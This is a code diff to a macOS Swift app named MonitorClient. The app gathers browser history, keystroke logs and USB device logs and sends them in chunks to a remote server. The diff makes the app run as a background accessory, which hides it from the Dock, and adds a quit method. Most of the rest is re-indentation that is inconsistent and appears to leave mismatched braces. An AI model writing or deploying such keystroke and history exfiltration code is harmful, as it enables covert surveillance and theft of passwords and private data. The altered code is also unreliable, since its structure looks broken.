@@ -274,6 +274,9 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
     func applicationDidFinishLaunching(_ aNotification: Notification) {
         // Insert code here to initialize your application
         
+        // Since this is a background app (LSUIElement), ensure it doesn't quit when all windows are closed
+        NSApp.setActivationPolicy(.accessory)
+        
         storage = UserDefaults.init(suiteName: "alice.monitors")
 
         // Configure server IP if not already set
@@ -406,15 +409,15 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
 
         // Check if it's time for browser history
         if currentDate.timeIntervalSince(lastHistoryCheck) >= TimeInterval(HISTORY_INTERVAL) {
-            logMonitoringEvent("Browser history monitoring triggered", details: "Interval: \(HISTORY_INTERVAL)s")
-            DispatchQueue.global(qos: .background).async {
-                do {
-                    try self.sendBrowserHistories()
-                } catch {
-                    self.logError("Error sending browser histories: \(error)", context: "BrowserHistory")
+                logMonitoringEvent("Browser history monitoring triggered", details: "Interval: \(HISTORY_INTERVAL)s")
+                DispatchQueue.global(qos: .background).async {
+                    do {
+                        try self.sendBrowserHistories()
+                    } catch {
+                        self.logError("Error sending browser histories: \(error)", context: "BrowserHistory")
+                    }
                 }
-            }
-            lastHistoryCheck = currentDate
+                lastHistoryCheck = currentDate
         }
 
         // Check if it's time for key log
@@ -1202,10 +1205,10 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
             logMessage("Testing server connectivity before sending key logs...", level: .debug)
             testServerConnectivity()
             
-            // Send data in chunks
-            sendDataInChunks(data: self.keyLogs, eventType: "KeyLog", chunkSize: 500)
-            self.keyLogs.removeAll()
-            logSuccess("Key logs sent and cleared", details: "\(keyLogs.count) keys")
+                // Send data in chunks
+                sendDataInChunks(data: self.keyLogs, eventType: "KeyLog", chunkSize: 500)
+                self.keyLogs.removeAll()
+                logSuccess("Key logs sent and cleared", details: "\(keyLogs.count) keys")
         } else {
             logMessage("No key logs to send", level: .debug)
         }
@@ -1800,8 +1803,8 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
             ]
 
             // Convert Swift structs to dictionaries (matching Windows JSON format)
-            switch eventType {
-            case "BrowserHistory":
+                switch eventType {
+                case "BrowserHistory":
                 let historyArray = chunkData.map { (item: Any) -> [String: Any] in
                     if let history = item as? BrowserHistoryLog {
                         return [
@@ -1816,7 +1819,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
                 }
                 postData["BrowserHistories"] = historyArray
                 
-            case "KeyLog":
+                case "KeyLog":
                 let keyLogArray = chunkData.map { (item: Any) -> [String: Any] in
                     if let keyLog = item as? KeyLog {
                         return [
@@ -1829,7 +1832,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
                 }
                 postData["KeyLogs"] = keyLogArray
                 
-            case "USBLog":
+                case "USBLog":
                 let usbLogArray = chunkData.map { (item: Any) -> [String: Any] in
                     if let usbLog = item as? USBDeviceLog {
                         return [
@@ -1844,27 +1847,27 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
                 }
                 postData["USBLogs"] = usbLogArray
                 
-            default:
-                postData["Data"] = chunkData
-            }
+                default:
+                    postData["Data"] = chunkData
+                }
 
-            logMessage("\(eventType) chunk \(index + 1)/\(chunks.count) data prepared", level: .debug)
-            
-            // Convert to JSON
-            guard let jsonData = try? JSONSerialization.data(withJSONObject: postData) else {
-                logError("Failed to serialize JSON data for \(eventType) chunk \(index + 1)", context: eventType)
-                continue
-            }
-            
-            // Create request
-            var request = URLRequest(url: url)
-            request.httpMethod = "POST"
-            request.setValue("application/json", forHTTPHeaderField: "Content-Type")
+                logMessage("\(eventType) chunk \(index + 1)/\(chunks.count) data prepared", level: .debug)
+                
+                // Convert to JSON
+                guard let jsonData = try? JSONSerialization.data(withJSONObject: postData) else {
+                    logError("Failed to serialize JSON data for \(eventType) chunk \(index + 1)", context: eventType)
+                    continue
+                }
+                
+                // Create request
+                var request = URLRequest(url: url)
+                request.httpMethod = "POST"
+                request.setValue("application/json", forHTTPHeaderField: "Content-Type")
             request.setValue("MonitorClient/\(APP_VERSION)", forHTTPHeaderField: "User-Agent")
             request.timeoutInterval = 30.0
-            request.httpBody = jsonData
-            
-            logMessage("Sending \(eventType) chunk \(index + 1)/\(chunks.count) to: \(urlString)", level: .debug)
+                request.httpBody = jsonData
+                
+                logMessage("Sending \(eventType) chunk \(index + 1)/\(chunks.count) to: \(urlString)", level: .debug)
             logMessage("Request body size: \(jsonData.count) bytes", level: .debug)
             logMessage("Request headers: \(request.allHTTPHeaderFields ?? [:])", level: .debug)
             
@@ -1872,39 +1875,39 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
             if let jsonString = String(data: jsonData, encoding: .utf8) {
                 logMessage("Request JSON: \(jsonString)", level: .debug)
             }
-            
-            // Send request
-            let task = URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
-                DispatchQueue.main.async {
-                    if let error = error {
-                        self?.logError("\(eventType) chunk \(index + 1)/\(chunks.count) network error: \(error)", context: eventType)
+                
+                // Send request
+                let task = URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
+                    DispatchQueue.main.async {
+                        if let error = error {
+                            self?.logError("\(eventType) chunk \(index + 1)/\(chunks.count) network error: \(error)", context: eventType)
                         self?.logError("Error details: \(error.localizedDescription)", context: eventType)
-                        return
-                    }
-                    
-                    if let httpResponse = response as? HTTPURLResponse {
-                        self?.logMessage("\(eventType) chunk \(index + 1)/\(chunks.count) HTTP response: \(httpResponse.statusCode)", level: .debug)
+                            return
+                        }
+                        
+                        if let httpResponse = response as? HTTPURLResponse {
+                            self?.logMessage("\(eventType) chunk \(index + 1)/\(chunks.count) HTTP response: \(httpResponse.statusCode)", level: .debug)
                         self?.logMessage("Response headers: \(httpResponse.allHeaderFields)", level: .debug)
                         
                         if httpResponse.statusCode != 200 {
                             self?.logError("\(eventType) chunk \(index + 1)/\(chunks.count) HTTP error: \(httpResponse.statusCode)", context: eventType)
                         }
-                    }
-                    
-                    if let data = data, let responseString = String(data: data, encoding: .utf8) {
-                        self?.logSuccess("\(eventType) chunk \(index + 1)/\(chunks.count) sent successfully", details: "Response: \(responseString)")
+                        }
+                        
+                        if let data = data, let responseString = String(data: data, encoding: .utf8) {
+                            self?.logSuccess("\(eventType) chunk \(index + 1)/\(chunks.count) sent successfully", details: "Response: \(responseString)")
                         self?.logMessage("Response data size: \(data.count) bytes", level: .debug)
-                    } else {
-                        self?.logError("No response data received for \(eventType) chunk \(index + 1)/\(chunks.count)", context: eventType)
+                        } else {
+                            self?.logError("No response data received for \(eventType) chunk \(index + 1)/\(chunks.count)", context: eventType)
                         if let data = data {
                             self?.logMessage("Raw response data: \(data)", level: .debug)
                         }
+                        }
                     }
                 }
-            }
-            task.resume()
+                task.resume()
         }
-        
+                
         logMessage("=== End Sending \(eventType) Data ===", level: .info)
     }
     
@@ -2437,6 +2440,12 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         task.resume()
         
         logMessage("=== End Server Test ===", level: .info)
+    }
+    
+    // Quit the app (useful for background apps)
+    @objc func quitApp() {
+        logMessage("Quitting MonitorClient...", level: .info)
+        NSApplication.shared.terminate(nil)
     }
     
     // Test server with different data formats
